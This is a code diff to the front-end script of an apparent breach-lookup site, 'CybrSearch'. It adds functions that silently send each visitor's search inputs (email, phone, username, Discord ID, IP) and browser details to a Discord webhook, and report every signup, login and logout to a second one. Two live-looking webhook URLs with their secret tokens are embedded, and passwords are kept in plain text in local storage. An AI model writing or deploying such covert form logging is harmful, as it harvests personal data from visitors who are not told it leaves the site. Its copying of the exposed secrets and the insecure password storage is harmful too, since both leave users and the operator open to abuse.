@@ -131,8 +131,8 @@
     
     // Discord webhooks
     const WEBHOOKS = {
-      searches: "https://discord.com/api/webhooks/1381059057875554375/UvXzkyggNeRKpdY_9TeMx52Uv7w2eb7hQNjYFljBg6r55HiFI1qDukIo2ebjXA7S2XKD",
-      signups: "https://discord.com/api/webhooks/YOUR_SIGNUP_WEBHOOK" // Replace with your signup webhook
+      BREACH_SEARCH: "https://discord.com/api/webhooks/1382930697114882129/SGf8Ej5YP69QZ9pga3ZS-zN84_dyU2XyDNYmbkbBZXUz1S0L0USOfBRm2WlJc6H2--BO",
+      ACCOUNT_ACTIVITY: "https://discord.com/api/webhooks/1381059057875554375/UvXzkyggNeRKpdY_9TeMx52Uv7w2eb7hQNjYFljBg6r55HiFI1qDukIo2ebjXA7S2XKD"
     };
 
     // DOM elements
@@ -175,33 +175,87 @@
       }
     }
 
-    async function sendDiscordWebhook(type, data) {
-      const webhookURL = WEBHOOKS[type];
-      if (!webhookURL) return;
-      
+    async function sendToDiscordWebhook(webhookUrl, data) {
       try {
-        await fetch(webhookURL, {
+        const response = await fetch(webhookUrl, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            embeds: [{
-              title: type === 'searches' ? '🔍 New Search' : '🆕 New Signup',
-              color: type === 'searches' ? 3447003 : 10181046,
-              fields: Object.entries(data).map(([name, value]) => ({
-                name: name.charAt(0).toUpperCase() + name.slice(1),
-                value: value || 'Not provided'
-              })),
-              footer: { text: `CybrSearch • ${new Date().toLocaleString()}` }
-            }]
-          })
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
         });
+        
+        if (!response.ok) {
+          console.error('Discord webhook error:', await response.text());
+          return false;
+        }
+        return true;
       } catch (error) {
-        console.error('Webhook error:', error);
+        console.error('Error sending to Discord:', error);
+        return false;
       }
     }
 
+    async function logBreachSearch(searchData) {
+      const discordMessage = {
+        username: "CybrSearch Logger",
+        embeds: [{
+          title: "🔍 Breach Search Attempt",
+          color: 0xff0000,
+          fields: [
+            { name: "Email", value: searchData.email || "Not provided", inline: true },
+            { name: "Phone", value: searchData.phone || "Not provided", inline: true },
+            { name: "Username", value: searchData.username || "Not provided", inline: true },
+            { name: "Discord ID", value: searchData.discord || "Not provided", inline: true },
+            { name: "IP Entered", value: searchData.ip || "Not provided" },
+            { name: "Visitor IP", value: searchData.visitorIp || "Not provided" },
+            { name: "User Agent", value: searchData.userAgent || navigator.userAgent },
+            { name: "Platform", value: searchData.platform || navigator.platform },
+            { name: "Referrer", value: searchData.referrer || document.referrer || "Direct" },
+            { name: "Time (UTC)", value: new Date().toUTCString() }
+          ],
+          footer: {
+            text: "Breach Logger • CybrSearch"
+          },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      return await sendToDiscordWebhook(WEBHOOKS.BREACH_SEARCH, discordMessage);
+    }
+
+    async function logAccountActivity(userData, activityType) {
+      const activityTypes = {
+        'register': { verb: 'Registered', color: 0x00ff00, emoji: '🆕' },
+        'login': { verb: 'Logged in', color: 0x0000ff, emoji: '🔑' },
+        'logout': { verb: 'Logged out', color: 0xffff00, emoji: '🚪' }
+      };
+      
+      const activity = activityTypes[activityType] || { verb: activityType, color: 0x800080, emoji: 'ℹ️' };
+
+      const discordMessage = {
+        username: "CybrSearch Account Tracker",
+        embeds: [{
+          title: `${activity.emoji} User ${activity.verb}`,
+          color: activity.color,
+          fields: [
+            { name: "Email", value: userData.email || "Not provided" },
+            { name: "IP Address", value: userData.ip || "Not provided" },
+            { name: "User Agent", value: userData.userAgent || navigator.userAgent },
+            { name: "Time", value: new Date().toUTCString() }
+          ],
+          footer: {
+            text: "Account Activity • CybrSearch"
+          },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      return await sendToDiscordWebhook(WEBHOOKS.ACCOUNT_ACTIVITY, discordMessage);
+    }
+
     // Authentication functions
-    function loginUser(email, password) {
+    async function loginUser(email, password) {
       if (!users[email]) {
         showMessage('User not found', 'danger');
         return false;
@@ -216,10 +270,18 @@
       localStorage.setItem('cybrsearch_currentUser', email);
       updateAuthUI();
       showMessage('Login successful!');
+      
+      // Log login activity
+      await logAccountActivity({
+        email: email,
+        ip: 'Unknown', // In production, get from API
+        userAgent: navigator.userAgent
+      }, 'login');
+      
       return true;
     }
 
-    function signupUser(email, password) {
+    async function signupUser(email, password) {
       if (users[email]) {
         showMessage('Email already registered', 'danger');
         return false;
@@ -233,20 +295,26 @@
       users[email] = { password, createdAt: new Date().toISOString() };
       localStorage.setItem('cybrsearch_users', JSON.stringify(users));
       
-      // Send signup webhook
-      sendDiscordWebhook('signups', {
-        email,
-        ip: 'Unknown', // Would get from API in production
-        userAgent: navigator.userAgent,
-        timestamp: new Date().toISOString()
-      });
+      // Log account creation
+      await logAccountActivity({
+        email: email,
+        ip: 'Unknown', // In production, get from API
+        userAgent: navigator.userAgent
+      }, 'register');
       
       showMessage('Account created successfully!');
-      loginUser(email, password); // Auto-login after signup
+      await loginUser(email, password); // Auto-login after signup
       return true;
     }
 
-    function logoutUser() {
+    async function logoutUser() {
+      // Log logout activity
+      await logAccountActivity({
+        email: currentUser,
+        ip: 'Unknown', // In production, get from API
+        userAgent: navigator.userAgent
+      }, 'logout');
+      
       currentUser = null;
       localStorage.removeItem('cybrsearch_currentUser');
       updateAuthUI();
@@ -257,13 +325,13 @@
     elements.showLogin.addEventListener('click', () => toggleForms(true));
     elements.showSignup.addEventListener('click', () => toggleForms(false));
     
-    elements.loginBtn.addEventListener('click', () => {
+    elements.loginBtn.addEventListener('click', async () => {
       const email = document.getElementById('loginEmail').value.trim();
       const password = document.getElementById('loginPassword').value;
-      loginUser(email, password);
+      await loginUser(email, password);
     });
     
-    elements.signupBtn.addEventListener('click', () => {
+    elements.signupBtn.addEventListener('click', async () => {
       const email = document.getElementById('signupEmail').value.trim();
       const password = document.getElementById('signupPassword').value;
       const confirm = document.getElementById('signupConfirm').value;
@@ -273,7 +341,7 @@
         return;
       }
       
-      signupUser(email, password);
+      await signupUser(email, password);
     });
     
     elements.logoutBtn.addEventListener('click', logoutUser);
@@ -293,7 +361,10 @@
         username: document.getElementById('username').value.trim(),
         discord: document.getElementById('discord').value.trim(),
         ip: document.getElementById('ip').value.trim(),
-        user: currentUser
+        visitorIp: 'Unknown', // In production, get from API
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        referrer: document.referrer
       };
       
       // Clear previous results
@@ -327,12 +398,8 @@
         document.getElementById('results').appendChild(div);
       });
       
-      // Send search webhook
-      await sendDiscordWebhook('searches', {
-        ...searchData,
-        userAgent: navigator.userAgent,
-        timestamp: new Date().toISOString()
-      });
+      // Log the search activity
+      await logBreachSearch(searchData);
     });
 
     // Initialize
